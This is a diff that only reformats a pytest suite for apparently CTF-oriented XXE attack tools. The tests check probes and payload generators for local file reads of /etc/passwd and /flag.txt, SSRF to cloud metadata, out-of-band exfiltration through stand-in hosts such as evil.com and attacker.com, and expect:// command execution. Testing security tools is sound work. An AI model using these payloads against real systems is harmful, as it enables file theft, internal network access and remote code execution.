@@ -6,7 +6,11 @@ import json
 import pytest
 from unittest.mock import Mock, patch
 
-from ctf_solver.tools.xxe_tools import XxeProbeTool, XxePayloadGenerator, XxeDocTypeBuilder
+from ctf_solver.tools.xxe_tools import (
+    XxeProbeTool,
+    XxePayloadGenerator,
+    XxeDocTypeBuilder,
+)
 
 
 class TestXxeProbeToolBasics:
@@ -37,10 +41,9 @@ class TestXxeProbeToolBasics:
     def test_invalid_probe_type(self):
         """Test handling of invalid probe type."""
         tool = XxeProbeTool()
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api",
-            "probe_type": "invalid"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api", "probe_type": "invalid"})
+        )
         assert "Error" in result
         assert "probe_type" in result
 
@@ -80,11 +83,15 @@ class TestXxeProbeFileRead:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "file_read",
-            "target_file": "/etc/passwd"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/api/xml",
+                    "probe_type": "file_read",
+                    "target_file": "/etc/passwd",
+                }
+            )
+        )
 
         assert "VULNERABLE" in result
         assert "root:" in result
@@ -98,11 +105,15 @@ class TestXxeProbeFileRead:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "file_read",
-            "target_file": "/etc/hosts"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/api/xml",
+                    "probe_type": "file_read",
+                    "target_file": "/etc/hosts",
+                }
+            )
+        )
 
         assert "VULNERABLE" in result or "127.0.0.1" in result
 
@@ -115,11 +126,15 @@ class TestXxeProbeFileRead:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "file_read",
-            "target_file": "/flag.txt"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/api/xml",
+                    "probe_type": "file_read",
+                    "target_file": "/flag.txt",
+                }
+            )
+        )
 
         assert "VULNERABLE" in result or "flag" in result
 
@@ -134,10 +149,9 @@ class TestXxeProbeFileRead:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "file_read"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "file_read"})
+        )
 
         # Should detect base64 encoded content containing "root:"
         assert "Base64" in result or "VULNERABLE" in result
@@ -151,10 +165,9 @@ class TestXxeProbeFileRead:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "file_read"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "file_read"})
+        )
 
         assert "No direct XXE" in result or "not confirmed" in result.lower()
 
@@ -171,10 +184,9 @@ class TestXxeProbeSSRF:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "ssrf"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "ssrf"})
+        )
 
         assert "SSRF" in result or "ami-id" in result
 
@@ -187,10 +199,9 @@ class TestXxeProbeSSRF:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "ssrf"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "ssrf"})
+        )
 
         assert "SSRF" in result or "computeMetadata" in result
 
@@ -203,10 +214,9 @@ class TestXxeProbeSSRF:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "ssrf"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "ssrf"})
+        )
 
         assert "SSRF" in result or "vmId" in result
 
@@ -227,10 +237,9 @@ class TestXxeProbeSSRF:
         mock_session.post.side_effect = [baseline_response] + [ssrf_response] * 20
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "ssrf"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "ssrf"})
+        )
 
         # Should note response size change
         assert "Response size changed" in result or "Possible" in result
@@ -248,11 +257,15 @@ class TestXxeProbeOOB:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "oob",
-            "callback_host": "evil.com"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/api/xml",
+                    "probe_type": "oob",
+                    "callback_host": "evil.com",
+                }
+            )
+        )
 
         assert "OOB" in result or "Out-of-Band" in result
         assert "evil.com" in result
@@ -267,11 +280,15 @@ class TestXxeProbeOOB:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "oob",
-            "callback_host": "attacker.com"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/api/xml",
+                    "probe_type": "oob",
+                    "callback_host": "attacker.com",
+                }
+            )
+        )
 
         assert "DTD" in result
         assert "attacker.com" in result
@@ -284,15 +301,16 @@ class TestXxeProbeError:
         """Test detection of XML/XXE error indicators."""
         mock_session = Mock()
         mock_response = Mock()
-        mock_response.text = "Error: XML parsing failed. External entity reference not allowed."
+        mock_response.text = (
+            "Error: XML parsing failed. External entity reference not allowed."
+        )
         mock_response.status_code = 500
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "error"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "error"})
+        )
 
         assert "Error" in result or "external entity" in result.lower()
 
@@ -305,10 +323,9 @@ class TestXxeProbeError:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api/xml",
-            "probe_type": "error"
-        }))
+        result = tool.use(
+            json.dumps({"url": "http://test.com/api/xml", "probe_type": "error"})
+        )
 
         assert "libxml" in result.lower() or "Error" in result
 
@@ -325,11 +342,15 @@ class TestXxeProbeXmlParam:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/process",
-            "xml_param": "data",
-            "probe_type": "file_read"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/process",
+                    "xml_param": "data",
+                    "probe_type": "file_read",
+                }
+            )
+        )
 
         # Verify the parameter is noted in output
         assert "data" in result or "VULNERABLE" in result
@@ -343,12 +364,16 @@ class TestXxeProbeXmlParam:
         mock_session.get.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api",
-            "method": "GET",
-            "xml_param": "xml",
-            "probe_type": "file_read"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "url": "http://test.com/api",
+                    "method": "GET",
+                    "xml_param": "xml",
+                    "probe_type": "file_read",
+                }
+            )
+        )
 
         # Should use GET method
         mock_session.get.assert_called()
@@ -393,10 +418,9 @@ class TestXxePayloadGeneratorFileRead:
     def test_generates_basic_file_read(self):
         """Test basic file read payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "file_read",
-            "target": "/etc/passwd"
-        }))
+        result = tool.use(
+            json.dumps({"payload_type": "file_read", "target": "/etc/passwd"})
+        )
 
         assert "file:///etc/passwd" in result
         assert "ENTITY" in result
@@ -405,10 +429,9 @@ class TestXxePayloadGeneratorFileRead:
     def test_generates_php_base64_payload(self):
         """Test PHP base64 filter payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "file_read",
-            "target": "/flag.txt"
-        }))
+        result = tool.use(
+            json.dumps({"payload_type": "file_read", "target": "/flag.txt"})
+        )
 
         assert "php://filter" in result
         assert "base64" in result
@@ -416,21 +439,24 @@ class TestXxePayloadGeneratorFileRead:
     def test_generates_cdata_payload(self):
         """Test CDATA extraction payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "file_read",
-            "target": "/etc/passwd"
-        }))
+        result = tool.use(
+            json.dumps({"payload_type": "file_read", "target": "/etc/passwd"})
+        )
 
         assert "CDATA" in result
 
     def test_custom_root_element(self):
         """Test custom root element in payload."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "file_read",
-            "target": "/etc/passwd",
-            "root_element": "data"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "payload_type": "file_read",
+                    "target": "/etc/passwd",
+                    "root_element": "data",
+                }
+            )
+        )
 
         assert "<data>" in result
         assert "</data>" in result
@@ -438,9 +464,7 @@ class TestXxePayloadGeneratorFileRead:
     def test_includes_tips(self):
         """Test that tips are included."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "file_read"
-        }))
+        result = tool.use(json.dumps({"payload_type": "file_read"}))
 
         assert "Tips" in result
 
@@ -451,10 +475,9 @@ class TestXxePayloadGeneratorSSRF:
     def test_generates_http_ssrf(self):
         """Test HTTP SSRF payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "ssrf",
-            "target": "127.0.0.1:8080"
-        }))
+        result = tool.use(
+            json.dumps({"payload_type": "ssrf", "target": "127.0.0.1:8080"})
+        )
 
         assert "http://127.0.0.1:8080" in result
         assert "SYSTEM" in result
@@ -462,30 +485,23 @@ class TestXxePayloadGeneratorSSRF:
     def test_generates_https_ssrf(self):
         """Test HTTPS SSRF payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "ssrf",
-            "target": "internal.server.com"
-        }))
+        result = tool.use(
+            json.dumps({"payload_type": "ssrf", "target": "internal.server.com"})
+        )
 
         assert "https" in result.lower()
 
     def test_generates_ftp_ssrf(self):
         """Test FTP SSRF payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "ssrf",
-            "target": "localhost"
-        }))
+        result = tool.use(json.dumps({"payload_type": "ssrf", "target": "localhost"}))
 
         assert "ftp://" in result
 
     def test_generates_gopher_ssrf(self):
         """Test Gopher SSRF payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "ssrf",
-            "target": "127.0.0.1"
-        }))
+        result = tool.use(json.dumps({"payload_type": "ssrf", "target": "127.0.0.1"}))
 
         assert "gopher://" in result
 
@@ -496,10 +512,7 @@ class TestXxePayloadGeneratorOOB:
     def test_generates_external_dtd_payload(self):
         """Test external DTD payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "oob",
-            "callback": "evil.com"
-        }))
+        result = tool.use(json.dumps({"payload_type": "oob", "callback": "evil.com"}))
 
         assert "evil.com" in result
         assert "DTD" in result
@@ -507,10 +520,9 @@ class TestXxePayloadGeneratorOOB:
     def test_generates_param_oob_payload(self):
         """Test parameter entity OOB payload."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "oob",
-            "callback": "attacker.com"
-        }))
+        result = tool.use(
+            json.dumps({"payload_type": "oob", "callback": "attacker.com"})
+        )
 
         assert "%" in result  # Parameter entity
         assert "attacker.com" in result
@@ -518,21 +530,18 @@ class TestXxePayloadGeneratorOOB:
     def test_generates_dns_exfil_payload(self):
         """Test DNS exfiltration payload."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "oob",
-            "callback": "burp.net"
-        }))
+        result = tool.use(json.dumps({"payload_type": "oob", "callback": "burp.net"}))
 
         assert "burp.net" in result
 
     def test_includes_external_dtd_templates(self):
         """Test that external DTD templates are included."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "oob",
-            "callback": "test.com",
-            "target": "/etc/passwd"
-        }))
+        result = tool.use(
+            json.dumps(
+                {"payload_type": "oob", "callback": "test.com", "target": "/etc/passwd"}
+            )
+        )
 
         assert "External DTD" in result
         assert "evil.dtd" in result
@@ -544,10 +553,7 @@ class TestXxePayloadGeneratorRCE:
     def test_generates_expect_payload(self):
         """Test expect:// RCE payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "rce",
-            "target": "id"
-        }))
+        result = tool.use(json.dumps({"payload_type": "rce", "target": "id"}))
 
         assert "expect://" in result
         assert "id" in result
@@ -555,10 +561,7 @@ class TestXxePayloadGeneratorRCE:
     def test_generates_data_payload(self):
         """Test data:// RCE payload generation."""
         tool = XxePayloadGenerator()
-        result = tool.use(json.dumps({
-            "payload_type": "rce",
-            "target": "whoami"
-        }))
+        result = tool.use(json.dumps({"payload_type": "rce", "target": "whoami"}))
 
         assert "data://" in result
 
@@ -593,13 +596,17 @@ class TestXxeDocTypeBuilderPayloads:
     def test_generates_basic_entity(self):
         """Test basic entity generation."""
         tool = XxeDocTypeBuilder()
-        result = tool.use(json.dumps({
-            "entities": [
-                {"name": "xxe", "value": "file:///etc/passwd", "system": True}
-            ],
-            "root": "data",
-            "content": "&xxe;"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "entities": [
+                        {"name": "xxe", "value": "file:///etc/passwd", "system": True}
+                    ],
+                    "root": "data",
+                    "content": "&xxe;",
+                }
+            )
+        )
 
         assert "DOCTYPE" in result
         assert "ENTITY xxe SYSTEM" in result
@@ -609,11 +616,20 @@ class TestXxeDocTypeBuilderPayloads:
     def test_generates_parameter_entity(self):
         """Test parameter entity generation."""
         tool = XxeDocTypeBuilder()
-        result = tool.use(json.dumps({
-            "entities": [
-                {"name": "file", "value": "file:///etc/passwd", "type": "parameter", "system": True}
-            ]
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "entities": [
+                        {
+                            "name": "file",
+                            "value": "file:///etc/passwd",
+                            "type": "parameter",
+                            "system": True,
+                        }
+                    ]
+                }
+            )
+        )
 
         assert "% file" in result or "%file" in result
         assert "SYSTEM" in result
@@ -621,13 +637,17 @@ class TestXxeDocTypeBuilderPayloads:
     def test_generates_multiple_entities(self):
         """Test multiple entity generation."""
         tool = XxeDocTypeBuilder()
-        result = tool.use(json.dumps({
-            "entities": [
-                {"name": "a", "value": "file:///etc/passwd", "system": True},
-                {"name": "b", "value": "&a;&a;"}
-            ],
-            "content": "&b;"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "entities": [
+                        {"name": "a", "value": "file:///etc/passwd", "system": True},
+                        {"name": "b", "value": "&a;&a;"},
+                    ],
+                    "content": "&b;",
+                }
+            )
+        )
 
         assert "ENTITY a SYSTEM" in result
         assert "ENTITY b" in result
@@ -636,12 +656,14 @@ class TestXxeDocTypeBuilderPayloads:
     def test_accepts_raw_entity_string(self):
         """Test raw entity string input."""
         tool = XxeDocTypeBuilder()
-        result = tool.use(json.dumps({
-            "entities": [
-                '<!ENTITY xxe SYSTEM "file:///flag.txt">'
-            ],
-            "content": "&xxe;"
-        }))
+        result = tool.use(
+            json.dumps(
+                {
+                    "entities": ['<!ENTITY xxe SYSTEM "file:///flag.txt">'],
+                    "content": "&xxe;",
+                }
+            )
+        )
 
         assert "file:///flag.txt" in result
 
@@ -672,7 +694,10 @@ class TestXxePayloadsContent:
         """Test that XxeProbeTool has common file list."""
         assert len(XxeProbeTool.COMMON_FILES) > 0
         assert "/etc/passwd" in XxeProbeTool.COMMON_FILES
-        assert "/flag.txt" in XxeProbeTool.COMMON_FILES or "/flag" in XxeProbeTool.COMMON_FILES
+        assert (
+            "/flag.txt" in XxeProbeTool.COMMON_FILES
+            or "/flag" in XxeProbeTool.COMMON_FILES
+        )
 
     def test_probe_tool_has_file_indicators(self):
         """Test that XxeProbeTool has file content indicators."""
@@ -701,32 +726,34 @@ class TestXxeIntegration:
         mock_session.post.return_value = mock_response
 
         probe_tool = XxeProbeTool(session=mock_session)
-        probe_result = probe_tool.use(json.dumps({
-            "url": "http://target.com/api",
-            "probe_type": "file_read"
-        }))
+        probe_result = probe_tool.use(
+            json.dumps({"url": "http://target.com/api", "probe_type": "file_read"})
+        )
 
         assert "VULNERABLE" in probe_result
 
         # Then generate targeted payload
         generator = XxePayloadGenerator()
-        payload_result = generator.use(json.dumps({
-            "payload_type": "file_read",
-            "target": "/flag.txt"
-        }))
+        payload_result = generator.use(
+            json.dumps({"payload_type": "file_read", "target": "/flag.txt"})
+        )
 
         assert "file:///flag.txt" in payload_result
 
     def test_builder_then_inject(self):
         """Test workflow: build custom DOCTYPE, then use."""
         builder = XxeDocTypeBuilder()
-        build_result = builder.use(json.dumps({
-            "entities": [
-                {"name": "xxe", "value": "file:///etc/passwd", "system": True}
-            ],
-            "root": "request",
-            "content": "<user>&xxe;</user>"
-        }))
+        build_result = builder.use(
+            json.dumps(
+                {
+                    "entities": [
+                        {"name": "xxe", "value": "file:///etc/passwd", "system": True}
+                    ],
+                    "root": "request",
+                    "content": "<user>&xxe;</user>",
+                }
+            )
+        )
 
         assert "DOCTYPE" in build_result
         assert "<request>" in build_result
@@ -742,9 +769,7 @@ class TestXxeEdgeCases:
         mock_session.post.side_effect = Exception("Connection refused")
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api"
-        }))
+        result = tool.use(json.dumps({"url": "http://test.com/api"}))
 
         assert "Error" in result or "Connection" in result
 
@@ -757,9 +782,7 @@ class TestXxeEdgeCases:
         mock_session.post.return_value = mock_response
 
         tool = XxeProbeTool(session=mock_session)
-        result = tool.use(json.dumps({
-            "url": "http://test.com/api"
-        }))
+        result = tool.use(json.dumps({"url": "http://test.com/api"}))
 
         # Should complete without error
         assert "Scan" in result or "Summary" in result
@@ -767,19 +790,19 @@ class TestXxeEdgeCases:
     def test_special_characters_in_target(self):
         """Test handling of special characters in target file."""
         generator = XxePayloadGenerator()
-        result = generator.use(json.dumps({
-            "payload_type": "file_read",
-            "target": "/path/with spaces/file.txt"
-        }))
+        result = generator.use(
+            json.dumps(
+                {"payload_type": "file_read", "target": "/path/with spaces/file.txt"}
+            )
+        )
 
         assert "/path/with spaces/file.txt" in result
 
     def test_unicode_in_callback(self):
         """Test handling of unicode in callback host."""
         generator = XxePayloadGenerator()
-        result = generator.use(json.dumps({
-            "payload_type": "oob",
-            "callback": "test.example.com"
-        }))
+        result = generator.use(
+            json.dumps({"payload_type": "oob", "callback": "test.example.com"})
+        )
 
         assert "test.example.com" in result
